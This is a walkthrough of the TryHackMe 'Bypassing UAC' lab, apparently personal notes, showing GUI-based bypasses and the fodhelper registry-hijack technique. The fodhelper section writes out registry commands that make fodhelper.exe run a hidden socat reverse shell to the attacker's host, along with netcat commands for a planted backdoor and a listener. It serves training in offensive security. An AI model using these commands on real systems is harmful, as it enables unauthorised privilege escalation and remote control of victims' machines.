# Bypassing UAC

**Room Link:** [https://tryhackme.com/room/bypassinguac](https://tryhackme.com/room/bypassinguac)



## UAC: GUI based bypasses

### Case study: msconfig

**Victim(cmd)**

```
msconfig
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Case study: azman.msc

**Victim(cmd)**

```
azman.msc
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This will spawn a notepad process that we can leverage to get a shell. To do so, go to File->Open and make sure to select All Files in the combo box on the lower right corner. Go to C:\Windows\System32 and search for cmd.exe and right-click to select Open:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



## UAC: Auto-Elevating Processes

### Case study: Fodhelper

**Victim(cmd)**

```
regedit
```

When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (ProgID) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the **HKEY\_CLASSES\_ROOT** will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### Putting it all together

One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.

To connect to the backdoor, you can use the following command:

**Kali**

```
nc $VICTIM 9999
```

Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

**Victim(cmd)**

```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:$KALI:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 4444
```

And then proceed to execute fodhelper.exe, which in turn will trigger the execution of our reverse shell:

**Victim(cmd)**

```
fodhelper.exe
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## UAC: Improving the Fodhelper Exploit to Bypass Windows Defender



## UAC: Environment Variable Expansion
